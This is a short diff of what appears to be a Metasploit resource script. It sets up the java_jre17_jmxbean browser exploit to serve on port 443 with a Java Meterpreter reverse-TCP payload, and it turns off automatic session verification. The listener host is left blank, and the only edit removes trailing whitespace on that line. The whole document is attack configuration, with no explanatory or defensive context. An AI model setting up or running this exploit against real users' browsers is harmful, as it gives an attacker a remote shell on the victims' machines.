@@ -2,7 +2,7 @@ use exploit/multi/browser/java_jre17_jmxbean
 set SRVPORT 443
 set URIPATH /
 set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 
+set LHOST
 set LPORT 443
 set AutoLoadStdapi false
 set AutoVerifySession false
